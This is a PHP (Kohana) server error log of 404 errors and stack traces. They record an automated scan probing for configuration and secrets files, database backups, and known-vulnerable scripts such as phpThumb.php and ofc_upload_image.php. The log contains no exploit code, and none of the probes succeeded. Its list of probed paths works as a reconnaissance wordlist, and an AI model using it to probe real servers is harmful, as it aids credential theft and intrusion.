2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mambots/editors/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mambots/editors/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: struts/webconsole.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: struts/webconsole.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.Development.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.Development.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/scripts/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/scripts/tinymce/jscripts/tiny_mce/plugins/ibrowser/scripts/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.Staging.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.Staging.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: modules/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: modules/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: localconfig.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: localconfig.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL 7SNi0j8H was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL 7SNi0j8H was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.Production.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsettings.Production.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/openflashchart/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/openflashchart/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbdump.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL CFIDE/scripts/ajax/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL CFIDE/scripts/ajax/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: localconfig.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: localconfig.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsecrets.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: appsecrets.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configuration.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configuration.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configuration.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: configuration.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: package-lock.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: package-lock.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docker-compose.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: settings.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL js/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL js/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/scripts/openflashchart/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: public/scripts/openflashchart/open-flash-chart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: manager/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: manager/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: global.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: global.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL gs/plugins/editors/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL gs/plugins/editors/fckeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: parameters.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: parameters.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL www/js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL www/js/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: thumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: thumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL www/js/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL www/js/tinymce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.inc ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_tipster/open-flash-chart/php-ofc-library/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_tipster/open-flash-chart/php-ofc-library/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: global/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: global/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml" ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_hotornot2/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: components/com_hotornot2/phpthumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: database.inc.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin_area/charts/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin_area/charts/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml;949380@ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitemap.xml;949380@ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL editors/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL editors/FCKeditor was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: requirements.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: requirements.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backup.zip ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL plugins/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL plugins/tiny_mce was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: staticfiles/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: staticfiles/phpThumb/phpThumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tox.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tox.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: environment.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: content/phpthumb/phpthumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: environment.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: content/phpthumb/phpthumb.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bitbucket-pipelines.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: bitbucket-pipelines.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
